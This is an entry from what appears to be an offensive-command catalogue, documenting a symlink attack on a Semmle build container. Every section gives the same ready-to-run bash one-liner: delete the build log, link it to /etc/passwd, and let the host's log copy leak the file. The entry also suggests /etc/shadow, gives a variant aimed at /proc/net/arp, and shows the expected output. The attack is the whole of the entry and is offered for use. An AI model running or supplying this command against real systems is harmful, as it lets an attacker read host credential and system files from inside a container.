---
id: cmd-uuid-694181
name: create-symlink-to-host-file-in-build-log
type: command
executor: bash
data: >-
  rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd
  /opt/out/snapshot/log/build.log
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.859Z'
platforms:
  - Linux
tags:
  - container-escape
  - symlink-attack
verified: false
validated: true
submitted: true
---

# create-symlink-to-host-file-in-build-log

## Command

```bash
rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

## Description

This command removes the original build log file in a Semmle container's output directory and replaces it with a symbolic link to a sensitive host file like /etc/passwd. It exploits the host's log copy mechanism to enable arbitrary file reading outside the container.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/opt/out/snapshot/log/build.log` | Path to the container's build log file to remove and replace | Yes |
| `/etc/passwd` | Target host file to symlink to (change for other files like /etc/shadow) | Yes |

## Examples

### Basic Usage

```bash
rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

### Advanced Usage

```bash
rm -rf /opt/out/snapshot/log/build.log && ln -s /proc/net/arp /opt/out/snapshot/log/build.log
```

> Targets network ARP table for private IP exposure.

## Expected Output

No stdout output on success; the file system shows the symlink with `ls -l` displaying `lrwxrwxrwx ... build.log -> /etc/passwd`. When host copies, the log contains host file contents, e.g., user entries from /etc/passwd.

## Related

- [[Related Procedure|procedures/Exploit-Symlink-in-Semmle-Build-Log-for-Container-Escape]]
